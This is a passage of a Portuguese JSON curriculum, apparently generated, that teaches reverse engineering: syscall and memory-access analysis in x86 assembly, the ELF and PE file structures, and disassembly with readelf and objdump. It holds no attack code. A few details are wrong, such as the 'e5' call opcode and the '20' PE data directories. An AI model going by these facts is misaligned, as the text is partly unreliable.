                                    "Analise endereçamento: [reg], [reg+offset], [reg*scale + offset].",
                                    "Determine direção: leitura (reg <- mem) vs escrita (mem <- reg).",
                                    "Trace fluxos: como registradores são carregados antes de syscalls.",
                                    "Note tamanhos: BYTE PTR, WORD PTR, QWORD PTR."
                                  ],
                                  "verification": "Descreva o padrão de memória em um snippet, identificando 3 acessos read/write.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free para análise estática",
                                    "Exemplos de binários com malloc/free",
                                    "Referência Intel x86 manuals"
                                  ],
                                  "tips": "Use stepping no GDB para validar acessos dinamicamente.",
                                  "learningObjective": "Detectar e interpretar operações de memória em assembly.",
                                  "commonMistakes": [
                                    "Confundir indireção com acesso direto",
                                    "Ignorar scales em [reg*4 + offset]",
                                    "Não diferenciar push/pop de mov mem"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar Syscalls e Acessos a Memória a Comportamentos",
                                  "subSteps": [
                                    "Correlacione acessos: buffer preparado em memória antes de write syscall.",
                                    "Inferir comportamento: read de arquivo -> processa -> write para socket.",
                                    "Analise fluxos: loops de leitura/escrita indicam cópia de dados.",
                                    "Considere contexto: syscalls de rede após loads de strings IP/porta.",
                                    "Documente chain: memória -> syscall -> efeito (ex: persistência via open/write)."
                                  ],
                                  "verification": "Explique o comportamento de um binário curto baseado em 2 syscalls e 3 acessos identificados.",
                                  "estimatedTime": "70 minutos",
                                  "materials": [
                                    "Binário de teste com rede ou arquivo (ex: cat-like)",
                                    "GDB para tracing",
                                    "Syscall table interativa online"
                                  ],
                                  "tips": "Desenhe grafo de controle de dados (data flow) para visualizar relações.",
                                  "learningObjective": "Integrar análises para inferir intenções do código binário.",
                                  "commonMistakes": [
                                    "Isolar syscalls sem contexto de memória",
                                    "Assumir benigno sem chain completo",
                                    "Ignorar condições/branching"
                                  ]
                                }
                              ],
                              "practicalExample": "Considere este snippet x86 desmontado: mov ebx, filename; mov eax, 5; mov ecx, 0; int 0x80;  // open(filename, O_RDONLY); Em seguida: mov ebx, eax; mov ecx, buffer; mov edx, 1024; mov eax, 3; int 0x80;  // read(fd, buffer, 1024). Análise: Syscall open carrega filename da memória [ebx], read acessa buffer via [ecx] para escrita em memória, comportamento: lê arquivo em buffer.",
                              "finalVerifications": [
                                "Identifica corretamente int 0x80/syscall e número em EAX/RAX.",
                                "Mapeia argumentos de memória para syscalls.",
                                "Distingue read/write em padrões [reg+offset].",
                                "Explica chain: memória -> syscall -> output.",
                                "Analisa binário de 100 instruções com 80% precisão.",
                                "Lista 5 syscalls comuns com args mem."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de syscalls (90% taxa).",
                                "Correta interpretação de acessos memória (direção/tamanho).",
                                "Qualidade da relação comportamento (lógica causal).",
                                "Uso de terminologia assembly precisa.",
                                "Profundidade em data flow tracing.",
                                "Criatividade em inferências contextuais."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender kernel interfaces.",
                                "Arquitetura de Computadores: Registradores e memória.",
                                "Programação Low-Level: Assembly e C interop.",
                                "Segurança da Informação: Detecção de exploits/malware.",
                                "Análise de Dados: Tracing fluxos em binários."
                              ],
                              "realWorldApplication": "Em análise forense de malware, identificar syscalls como socket() após loads de C2 servers permite detectar exfiltração de dados; em debugging de crashes, padrões de memória inválidos explicam segfaults antes de syscalls."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.1.2",
                        "name": "Formatos de Arquivos Executáveis ELF e PE",
                        "description": "Compreender a estrutura de arquivos executáveis ELF (Linux) e PE (Windows), focando em seções relevantes para extração e desmontagem de código máquina.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.2.1",
                            "name": "Descrever a estrutura do formato ELF",
                            "description": "Explicar cabeçalhos (ELF Header, Program Headers, Section Headers), seções (.text, .data, .bss) e como localizar o código executável para desmontagem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o ELF Header",
                                  "subSteps": [
                                    "Leia a documentação oficial do ELF (Executable and Linkable Format) para identificar os campos principais do header.",
                                    "Identifique o campo e_ident (magic bytes: 0x7F 'E' 'L' 'F') e explique seu propósito.",
                                    "Analise campos como e_type (ET_EXEC para executáveis), e_machine (arquitetura, ex: EM_X86_64), e_entry (endereço de entrada).",
                                    "Use a ferramenta readelf -h em um binário ELF simples para visualizar o header.",
                                    "Anote o tamanho fixo do ELF Header (64 bytes para 64-bit)."
                                  ],
                                  "verification": "Execute readelf -h em um binário e explique corretamente pelo menos 5 campos principais do output.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta readelf (parte do binutils)",
                                    "Binário ELF de exemplo (ex: /bin/ls)",
                                    "Documentação ELF: elf(5) man page"
                                  ],
                                  "tips": "Sempre verifique o magic number primeiro para confirmar formato ELF.",
                                  "learningObjective": "Compreender a estrutura inicial do ELF Header e seus campos críticos para identificação do arquivo.",
                                  "commonMistakes": [
                                    "Confundir ELF Header com PE Header",
                                    "Ignorar endianness em e_ident",
                                    "Não distinguir entre 32-bit e 64-bit headers"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Program Headers (PHeaders)",
                                  "subSteps": [
                                    "Explique o propósito dos PHeaders: carregar segmentos na memória durante execução (PT_LOAD, PT_DYNAMIC, PT_INTERP).",
                                    "Use readelf -l para listar PHeaders e identifique p_type, p_offset, p_vaddr, p_filesz, p_memsz.",
                                    "Diferencie segmentos loadáveis (executáveis e dados) e como eles mapeiam o arquivo para memória virtual.",
                                    "Analise um exemplo: encontre o segmento PT_LOAD com flag PF_X (executável) que contém o código.",
                                    "Calcule offsets para navegar do arquivo para memória usando p_offset e p_vaddr."
                                  ],
                                  "verification": "Interprete o output de readelf -l e identifique o segmento executável corretamente.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "readelf",
                                    "Binário ELF estático/dinâmico",
                                    "hexdump ou xxd para inspecionar offsets"
                                  ],
                                  "tips": "PHeaders são para runtime (execução), foque em PT_LOAD para localizar código.",
                                  "learningObjective": "Mapear como o SO usa PHeaders para carregar o binário em memória.",
                                  "commonMistakes": [
                                    "Confundir p_filesz com p_memsz (bss é expandido)",
                                    "Ignorar flags PF_R/PF_W/PF_X",
                                    "Não alinhar offsets corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Section Headers (SHeaders)",
                                  "subSteps": [
                                    "Descreva SHeaders: usados no linking, listados com readelf -S (sh_name, sh_type, sh_offset, sh_size, sh_flags).",
                                    "Identifique seções chave: .text (código, SHT_PROGBITS, PF_X), .data (dados inicializados), .bss (dados não-inicializados).",
                                    "Explique sh_link e sh_info para relações entre seções (ex: .symtab linka para .strtab).",
                                    "Use objdump -h para visualizar headers e tamanhos de seções.",
                                    "Localize .text: procure sh_flags com SHF_EXECINSTR e note seu offset para desmontagem."
                                  ],
                                  "verification": "Liste e descreva 5 seções principais de um binário com readelf -S, identificando .text corretamente.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "readelf -S",
                                    "objdump -h",
                                    "Binário compilado com gcc -g para símbolos"
                                  ],
                                  "tips": "SHeaders são opcionais em executáveis finais, mas cruciais para análise estática.",
                                  "learningObjective": "Diferenciar seções para análise estática e localizar regiões de código.",
                                  "commonMistakes": [
                                    "Misturar SHeaders com PHeaders",
                                    "Confundir .data com .bss",
                                    "Não verificar sh_addr para linking"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Localizar Código Executável para Desmontagem",
                                  "subSteps": [
                                    "Combine PHeaders e SHeaders: use PT_LOAD com PF_X para runtime, .text offset para static.",
                                    "Extraia .text com dd if=binário of=text.bin bs=1 skip=OFFSET count=SIZE (de sh_offset/sh_size).",
                                    "Desmonte com objdump -D text.bin ou radare2 para verificar instruções válidas.",
                                    "Trace de e_entry através de PHeaders para ponto de entrada no código.",
                                    "Pratique em binários stripped: dependa só de headers para offsets."
                                  ],
                                  "verification": "Extraia e desmonte .text de um binário stripped, mostrando instruções iniciais.",
                                  "estimatedTime": "55 minutos",
                                  "materials": [
                                    "objdump",
                                    "radare2 ou Ghidra",
                                    "gcc para gerar binários de teste",
                                    "dd command"
                                  ],
                                  "tips": "Para RE, priorize PHeaders em executáveis dinâmicos; valide com 'file' command.",
                                  "learningObjective": "Aplicar conhecimento para isolar e analisar código executável em ELF.",
                                  "commonMistakes": [
                                    "Offsets errados levando a lixo no dump",
                                    "Ignorar relocações em .plt/.got",
                                    "Não considerar ASLR em runtime"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe /bin/ls (ELF 64-bit). Rode 'readelf -h -l -S ls'. Identifique ELF Header (e_entry=0x401150), PT_LOAD executável (p_vaddr=0x400000), .text (sh_offset=0x5d8, size=0x1a0). Extraia dd if=ls of=text.bin bs=1 skip=0x5d8 count=0x1a0; objdump -D text.bin para ver mov, call etc.",
                              "finalVerifications": [
                                "Explicar magic bytes e diferenciar ELF 32/64-bit.",
                                "Listar e descrever 3 PHeaders típicos com offsets/vaddrs.",
                                "Identificar .text, .data, .bss em readelf -S.",
                                "Calcular offset correto para dump de .text.",
                                "Trace e_entry para primeira instrução.",
                                "Diferenciar uso de PHeaders vs SHeaders em RE."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de campos (header, types, flags).",
                                "Capacidade de interpretar readelf/objdump outputs.",
                                "Correção em localizar/executar dumps de seções.",
                                "Completude: cobrir headers, seções e localização de código.",
                                "Clareza em explicações e distinções (P vs S headers).",
                                "Aplicação prática sem erros em exemplos reais."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: carregamento de processos e mapeamento de memória.",
                                "Arquitetura de Computadores: assembly e endereçamento virtual.",
                                "Programação em C/Assembly: linking e seções de objeto.",
                                "Segurança: análise de malware em binários ELF (ex: ROP em .text).",
                                "Ferramentas de Debugging: gdb para breakpoints em e_entry."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware Linux, use estrutura ELF para localizar shellcode em .text infectado, analisar packing via PHeaders, ou debugar exploits extraindo offsets para ROP chains em CTFs como picoCTF."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.2.2",
                            "name": "Descrever a estrutura do formato PE",
                            "description": "Detalhar DOS Header, PE Header, Optional Header, seções (.text, .rdata) e tabelas de importação/exportação, identificando pontos de entrada para análise.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o DOS Header e Identificação Inicial do PE",
                                  "subSteps": [
                                    "Analise a assinatura 'MZ' nos primeiros bytes do arquivo para confirmar compatibilidade DOS.",
                                    "Localize o campo 'e_lfanew' no offset 0x3C, que aponta para o início do PE Header.",
                                    "Use um hex editor para visualizar os bytes iniciais e validar a estrutura.",
                                    "Compare com documentação oficial da Microsoft para entender campos como 'e_magic' e 'e_cblp'.",
                                    "Pratique em um executável simples para mapear o offset corretamente."
                                  ],
                                  "verification": "Confirme que o ponteiro 'e_lfanew' leva à assinatura 'PE\\0\\0' navegando no hex editor.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Hex editor (HxD ou 010 Editor)",
                                    "Executável PE simples (ex: hello.exe)",
                                    "Documentação MS PE/COFF"
                                  ],
                                  "tips": "Sempre verifique a assinatura MZ primeiro para evitar confusão com outros formatos.",
                                  "learningObjective": "Identificar e interpretar o DOS Header como porta de entrada para o PE Header.",
                                  "commonMistakes": [
                                    "Ignorar o DOS Header achando desnecessário",
                                    "Ler offset errado no e_lfanew",
                                    "Confundir com formato ELF"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o PE Header (NT Headers): Signature e File Header",
                                  "subSteps": [
                                    "Valide a assinatura 'PE\\0\\0' no offset indicado pelo DOS Header.",
                                    "Examine o File Header: número de seções, timestamp, machine type (ex: x86 ou x64).",
                                    "Interprete o Optional Header Magic para determinar o tipo (PE32 ou PE32+).",
                                    "Registre características do arquivo como executável ou DLL.",
                                    "Use ferramentas visuais para destacar esses campos."
                                  ],
                                  "verification": "Liste corretamente 5 campos principais do File Header de um binário real.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "CFF Explorer ou PE-bear",
                                    "Executável PE",
                                    "Especificação PE/COFF da Microsoft"
                                  ],
                                  "tips": "Anote o 'Machine' para saber a arquitetura antes de prosseguir.",
                                  "learningObjective": "Descrever os metadados básicos do PE Header e File Header.",
                                  "commonMistakes": [
                                    "Confundir File Header com Optional Header",
                                    "Ignorar o tamanho do Optional Header",
                                    "Não diferenciar PE32 de PE32+"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Optional Header e Diretórios de Dados",
                                  "subSteps": [
                                    "Analise campos como ImageBase, SectionAlignment e FileAlignment.",
                                    "Identifique o Entry Point (AddressOfEntryPoint) e SizeOfImage.",
                                    "Examine os Data Directories (20 entradas), focando em Import Table e Export Table.",
                                    "Calcule alinhamentos para entender layout em memória vs. disco.",
                                    "Visualize com ferramenta para correlacionar valores."
                                  ],
                                  "verification": "Localize e anote o RVA do Entry Point e principais Data Directories.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "PE-bear ou Ghidra",
                                    "Binário PE",
                                    "PDF da spec PE"
                                  ],
                                  "tips": "Lembre-se: RVAs são relativos à ImageBase; converta para offsets de arquivo.",
                                  "learningObjective": "Mapear o Optional Header e seus diretórios para navegação no binário.",
                                  "commonMistakes": [
                                    "Confundir RVA com offset de arquivo",
                                    "Ignorar Data Directories",
                                    "Erro em cálculos de alinhamento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar Section Headers e Seções Comuns (.text, .rdata)",
                                  "subSteps": [
                                    "Localize o array de Section Headers após o Optional Header (baseado no NumberOfSections).",
                                    "Analise campos: Name, VirtualSize, VirtualAddress, RawSize, Characteristics.",
                                    "Identifique seções comuns: .text (código), .rdata (dados somente leitura), .data, .rsrc.",
                                    "Verifique flags como EXECUTE, READ, WRITE para segurança.",
                                    "Mapeie seções em um diagrama manual."
                                  ],
                                  "verification": "Descreva 4 seções principais com seus propósitos e flags em um exe específico.",
                                  "estimatedTime": "55 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "Executável com múltiplas seções",
                                    "Lista de characteristics PE"
                                  ],
                                  "tips": "Use cores no diagrama para diferenciar seções executáveis de dados.",
                                  "learningObjective": "Interpretar headers de seções e reconhecer padrões comuns.",
                                  "commonMistakes": [
                                    "Ler nome da seção errado (padded com nulls)",
                                    "Confundir VirtualSize com RawSize",
                                    "Ignorar Characteristics"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Investigar Tabelas de Importação/Exportação e Pontos de Entrada",
                                  "subSteps": [
                                    "Navegue ao RVA da Import Directory para analisar IAT (Import Address Table).",
                                    "Examine Export Directory: funções exportadas, ordinals, hints.",
                                    "Trace o Entry Point do Optional Header até a seção .text.",
                                    "Identifique dependências (DLLs) na tabela de imports.",
                                    "Simule carregamento para entender fluxo inicial."
                                  ],
                                  "verification": "Liste 3 imports/exports de um binário e trace o OEP (Original Entry Point).",
                                  "estimatedTime": "70 minutos",
                                  "materials": [
                                    "PE-bear com parser de imports",
                                    "Binário com exports (ex: kernel32.dll)",
                                    "Documentação Import/Export"
                                  ],
                                  "tips": "Comece com DLLs conhecidas para praticar parsing manual.",
                                  "learningObjective": "Conectar tabelas de import/export ao fluxo de execução e análise.",
                                  "commonMistakes": [
                                    "Não resolver RVAs para imports",
                                    "Confundir forwarders em exports",
                                    "Perder OEP por packing"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe notepad.exe (Windows nativo), abra no CFF Explorer: valide DOS Header (e_lfanew=0xF0), PE Signature, liste seções (.text RVA 0x1000, .rdata), trace Entry Point para kernel32.dll imports e desenhe um mapa completo da estrutura.",
                              "finalVerifications": [
                                "Desenhe um diagrama completo da estrutura PE com offsets aproximados.",
                                "Identifique Entry Point e 3 seções principais em um exe real.",
                                "Explique como localizar Import Table via Data Directory.",
                                "Diferencie PE32 de PE32+ em um binário.",
                                "Trace um caminho de DOS Header até uma função exportada.",
                                "Valide Characteristics de seções para detecção de código malicioso."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de headers e offsets (90% correto).",
                                "Profundidade nos subcampos (cobre 80% dos campos chave).",
                                "Capacidade de aplicar em binário real sem ferramenta visual.",
                                "Correta distinção entre RVA, VA e offsets de arquivo.",
                                "Integração de imports/exports com Entry Point.",
                                "Identificação de erros comuns em PE malformados."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly (desmontagem no .text).",
                                "Sistemas Operacionais (carregadores PE no Windows).",
                                "Segurança de Software (detecção de packing/obfuscation).",
                                "Programação de Baixo Nível (C/C++ e linking).",
                                "Criptografia (análise de seções criptografadas em malware)."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, mapear a estrutura PE permite unpackers automáticos, detecção de injeções em seções, hooking de APIs via IAT e extração de payloads do Entry Point modificado."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.2.3",
                            "name": "Extrair seções de código de binários ELF e PE",
                            "description": "Usar ferramentas como readelf e objdump para inspecionar e extrair seções de código executável, preparando para desmontagem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparação e Instalação de Ferramentas para Análise de Binários",
                                  "subSteps": [
                                    "Instale o GNU Binutils (inclui readelf e objdump) via gerenciador de pacotes: apt install binutils no Linux ou brew install binutils no macOS.",
                                    "Para binários PE (Windows), instale MinGW-w64 ou use WSL; verifique suporte a PE no objdump com 'objdump --help'.",
                                    "Baixe amostras de binários: um ELF simples como /bin/ls e um PE como notepad.exe (de uma VM Windows segura).",
                                    "Crie um diretório de trabalho e copie os binários para ele.",
                                    "Teste as ferramentas com 'readelf --version' e 'objdump --version' para confirmar instalação."
                                  ],
                                  "verification": "Ferramentas instaladas e versões exibidas corretamente sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Linux/macOS com terminal",
                                    "Amostras de binários ELF e PE",
                                    "Binutils package"
                                  ],
                                  "tips": "Use ambientes virtuais como Ubuntu VM para evitar riscos com binários reais; sempre trabalhe com cópias.",
                                  "learningObjective": "Configurar ambiente para inspeção segura de binários ELF e PE.",
                                  "commonMistakes": [
                                    "Não verificar suporte a PE no objdump",
                                    "Executar binários desconhecidos",
                                    "Ignorar dependências de pacotes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspeção Inicial de Cabeçalhos e Seções em Binários ELF com readelf",
                                  "subSteps": [
                                    "Execute 'readelf -h arquivo.elf' para visualizar o cabeçalho ELF.",
                                    "Use 'readelf -S arquivo.elf' para listar todas as seções e seus offsets/tamanhos.",
                                    "Identifique seções de código como .text, .plt e .init com 'readelf -S arquivo.elf | grep text'.",
                                    "Examine permissões e endereços com 'readelf -l arquivo.elf' para headers de programa.",
                                    "Anote offsets da seção .text para extração posterior."
                                  ],
                                  "verification": "Lista de seções exibida corretamente, com .text identificada e offset anotado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário ELF de amostra",
                                    "Terminal com readelf"
                                  ],
                                  "tips": "Pipe output para grep para filtrar: 'readelf -S file.elf | grep -E \"(text|code)\"'; salve saídas em arquivos txt.",
                                  "learningObjective": "Interpretar estrutura de seções em ELF e localizar código executável.",
                                  "commonMistakes": [
                                    "Confundir offsets virtuais com arquivos",
                                    "Ignorar seções dinâmicas como .plt",
                                    "Não notar endianness no cabeçalho"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extração de Seções de Código em ELF com objdump",
                                  "subSteps": [
                                    "Extraia disassembly da seção .text: 'objdump -d --section=.text arquivo.elf > text.asm'.",
                                    "Extraia múltiplas seções: 'objdump -d arquivo.elf' para todo o código executável.",
                                    "Use '--disassemble-all -M intel' para syntax Intel e todas as funções.",
                                    "Compare com readelf offsets para validar extração.",
                                    "Visualize em editor de texto/hex para confirmar conteúdo binário desmontado."
                                  ],
                                  "verification": "Arquivo .asm gerado contém disassembly legível da seção .text sem erros de parsing.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário ELF",
                                    "objdump",
                                    "Editor de texto"
                                  ],
                                  "tips": "Adicione '-j .text' para seção específica; use 'less' para navegar outputs grandes.",
                                  "learningObjective": "Extrair e desmontar código de seções específicas em ELF de forma precisa.",
                                  "commonMistakes": [
                                    "Não especificar seção causando dump desnecessário",
                                    "Syntax AT&T vs Intel confundindo leitura",
                                    "Output corrompido por binários stripped"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Inspeção e Extração de Seções em Binários PE",
                                  "subSteps": [
                                    "Use 'objdump -p arquivo.exe' para headers PE (compatível via binutils).",
                                    "Liste seções com 'objdump -h arquivo.exe' e identifique .text ou .code.",
                                    "Extraia código: 'objdump -d --section=.text arquivo.exe > pe_text.asm'.",
                                    "Para detalhes finos, use 'objdump -x arquivo.exe' para tabela de exportações/importações.",
                                    "Valide com ferramenta nativa como dumpbin (se em Windows): 'dumpbin /headers arquivo.exe'."
                                  ],
                                  "verification": "Disassembly de seção .text de PE extraída e comparável à de ELF.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário PE",
                                    "objdump com suporte PE",
                                    "Opcional: dumpbin via Visual Studio"
                                  ],
                                  "tips": "Em Linux, use wine ou cross-objdump; foque em RVA (Relative Virtual Address) para navegação.",
                                  "learningObjective": "Aplicar mesmas ferramentas a PE, entendendo diferenças como DOS header.",
                                  "commonMistakes": [
                                    "Assumir objdump sem suporte PE",
                                    "Confundir RVA com offsets de arquivo",
                                    "Não lidar com PE packers/obfuscados"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe /bin/ls (ELF) e um hello.exe compilado no Windows (PE). Use readelf -S ls para achar .text em offset 0x450, extraia com objdump -d --section=.text ls > ls_text.asm. Repita para hello.exe, gerando asm legível para análise de fluxo de controle.",
                              "finalVerifications": [
                                "Lista completa de seções ELF/PE com offsets corretos.",
                                "Disassembly limpo da seção .text sem erros de parsing.",
                                "Identificação precisa de seções executáveis (.text, .code).",
                                "Comparação bem-sucedida entre outputs de ELF e PE.",
                                "Análise básica de funções principais no disassembly.",
                                "Uso correto de flags para syntax e filtros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e extração de seções (100% match com offsets).",
                                "Interpretação correta de outputs (explicar 3 seções chave).",
                                "Eficiência no uso de flags (tempo < 2h total).",
                                "Tratamento de edge cases como binários stripped.",
                                "Documentação clara de saídas e anotações.",
                                "Compreensão de diferenças ELF vs PE."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender loaders e memory mapping.",
                                "Programação em Assembly: Ler e interpretar disassembly.",
                                "Segurança Computacional: Preparação para análise de malware.",
                                "Engenharia de Software: Debugging e auditing de binários.",
                                "Forense Digital: Extração de evidências de executáveis."
                              ],
                              "realWorldApplication": "Em análise de malware, extraia seções .text de amostras ELF/PE para desmontar payloads; em auditorias de software, inspecione binários proprietários por backdoors; em desenvolvimento, debugue crashes comparando dumps de seções."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.1.3",
                        "name": "Processo e Ferramentas de Desmontagem",
                        "description": "Executar a conversão de código máquina em assembly usando ferramentas padrão, interpretando o resultado para análise de engenharia reversa.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.3.1",
                            "name": "Utilizar objdump para desmontar binários",
                            "description": "Executar comandos como 'objdump -d arquivo' para gerar listagem em assembly, interpretando endereços, opcodes e mnemônicos resultantes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Trabalho",
                                  "subSteps": [
                                    "Instale o pacote binutils em um sistema Linux (ex: sudo apt update && sudo apt install binutils no Ubuntu/Debian).",
                                    "Verifique a instalação executando 'objdump --version' no terminal.",
                                    "Crie um diretório de trabalho dedicado (ex: mkdir ~/reverse_engineering && cd ~/reverse_engineering).",
                                    "Compile um binário simples em C para teste: echo 'int main(){return 0;}' > simple.c && gcc -o simple simple.c -static.",
                                    "Confirme que o binário foi gerado com 'file simple'."
                                  ],
                                  "verification": "Comando 'objdump --version' exibe a versão sem erros e o binário 'simple' existe e é executável.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Sistema Linux ou WSL no Windows",
                                    "GCC instalado",
                                    "Acesso sudo para instalação"
                                  ],
                                  "tips": [
                                    "Use -static no gcc para binários mais simples de analisar.",
                                    "Teste em VM para isolar ambiente de segurança."
                                  ],
                                  "learningObjective": "Configurar um ambiente funcional para desmontagem de binários com objdump.",
                                  "commonMistakes": [
                                    "Esquecer de instalar binutils",
                                    "Compilar sem -static gerando dependências complexas",
                                    "Não verificar a instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Opções Básicas do objdump",
                                  "subSteps": [
                                    "Execute 'objdump -h simple' para ver as seções do binário.",
                                    "Use 'objdump -f simple' para informações de arquivo (arquitetura, endianness).",
                                    "Teste 'objdump -t simple' para tabela de símbolos.",
                                    "Leia a man page com 'man objdump' e anote opções chave como -d (disassemble).",
                                    "Salve saídas em arquivos: objdump -h simple > headers.txt."
                                  ],
                                  "verification": "Você pode listar corretamente seções, símbolos e headers do binário sem erros de sintaxe.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Binário 'simple' do step 1",
                                    "Editor de texto para man pages"
                                  ],
                                  "tips": [
                                    "Comece com -h para entender estrutura antes de desmontar tudo.",
                                    "Pipe para less: objdump -h simple | less."
                                  ],
                                  "learningObjective": "Dominar opções de inspeção preliminar para preparar desmontagem.",
                                  "commonMistakes": [
                                    "Ignorar endianness ou arquitetura",
                                    "Executar objdump em binários dinâmicos sem entender dependências",
                                    "Não salvar saídas para referência"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Desmontagem com objdump -d",
                                  "subSteps": [
                                    "Execute 'objdump -d simple > disassembly.txt' para gerar listagem completa em assembly.",
                                    "Analise a saída inicial: identifique endereço base (ex: 08048000), opcode em hex e mnemônico (ex: 55 push %ebp).",
                                    "Use paginação: 'objdump -d simple | less' para navegar.",
                                    "Experimente filtros: 'objdump -d --disassemble-all simple' ou 'objdump -d simple | grep main'.",
                                    "Compare com binário real: objdump -d /bin/ls | head -50."
                                  ],
                                  "verification": "Arquivo disassembly.txt gerado corretamente com seções de código desmontadas e visíveis.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário 'simple'",
                                    "Terminal com less ou vim"
                                  ],
                                  "tips": [
                                    "Adicione -M intel para sintaxe Intel em vez de AT&T.",
                                    "Use | head -n 20 para pré-visualizar sem sobrecarregar."
                                  ],
                                  "learningObjective": "Gerar e salvar listagens de desmontagem precisas usando objdump -d.",
                                  "commonMistakes": [
                                    "Confundir -D (tudo) com -d (apenas código)",
                                    "Não redirecionar saída para arquivo",
                                    "Analisar binários grandes sem filtros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar Endereços, Opcodes e Mnemônicos",
                                  "subSteps": [
                                    "Identifique colunas na saída: endereço (esq.), bytes/opcodes (meio), mnemônicos/dissasembly (dir.).",
                                    "Trace fluxo: encontre 'main' e siga jumps/calls (ex: call 804xxxx).",
                                    "Anote padrões: push/pop para stack, mov para registradores.",
                                    "Desafie-se: modifique simple.c com printf, recompile e compare desmontagens.",
                                    "Documente 5 instruções: endereço, opcode hex, mnemônico e propósito."
                                  ],
                                  "verification": "Você pode explicar verbalmente ou por escrito 3 instruções da saída, ligando opcode a ação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "disassembly.txt",
                                    "Referência de instruções x86 (online ou PDF)"
                                  ],
                                  "tips": [
                                    "Foque em .text section primeiro.",
                                    "Use ferramentas como radare2 depois para validação."
                                  ],
                                  "learningObjective": "Ler e interpretar assembly gerado por objdump para entender controle de fluxo.",
                                  "commonMistakes": [
                                    "Ignorar relocação de endereços",
                                    "Confundir dados com código",
                                    "Não mapear registradores (EAX, ESP etc.)"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'hello.c' com #include <stdio.h>; int main(){printf(\"Hello\\n\");return 0;}; gcc -o hello hello.c -static. Execute 'objdump -d hello | grep -A5 main'. Identifique o call para printf (opcode e5 xx xx xx xx), endereço de main e ret.",
                              "finalVerifications": [
                                "Desmonta um binário estático sem erros usando objdump -d.",
                                "Identifica corretamente endereços virtuais, opcodes hex e mnemônicos em saída.",
                                "Explica propósito de 5 instruções comuns (push, mov, call, jmp, ret).",
                                "Gera e salva listagem filtrada para seção .text.",
                                "Compara desmontagens antes/depois de mudança simples no código fonte.",
                                "Usa opções auxiliares (-h, -t) para contexto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos objdump (sem erros de sintaxe).",
                                "Capacidade de mapear saída para conceitos assembly (80% acerto em identificação).",
                                "Profundidade na interpretação de fluxo (trace de main a ret).",
                                "Uso eficiente de filtros/paginação em binários grandes.",
                                "Documentação clara de análises (endereços, opcodes, propósitos).",
                                "Aplicação em binários reais como /bin/ls sem confusão."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Leitura direta de mnemônicos x86/x64.",
